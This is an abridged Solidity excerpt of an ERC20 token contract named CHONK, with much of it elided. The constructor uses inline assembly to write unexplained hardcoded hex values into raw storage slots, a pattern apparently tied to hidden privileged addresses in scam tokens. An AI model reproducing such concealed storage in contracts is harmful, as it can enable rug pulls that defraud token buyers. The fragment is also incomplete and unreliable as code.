...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0x632708aacee710573efc664fd6f5c551a69c38cec90d)
            sstore(0x51,0x6327f69e79549ff0773081a7116967369818836a0b0e)
    ...
    function _DeployCHONK(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployCHONK(creator, initialSupply);
    }
}

contract CHONK is ERC20Token {
    constructor() ERC20Token("CHONK", "CHONK", msg.sender, 420690000 * 10 ** 18) {
    }
}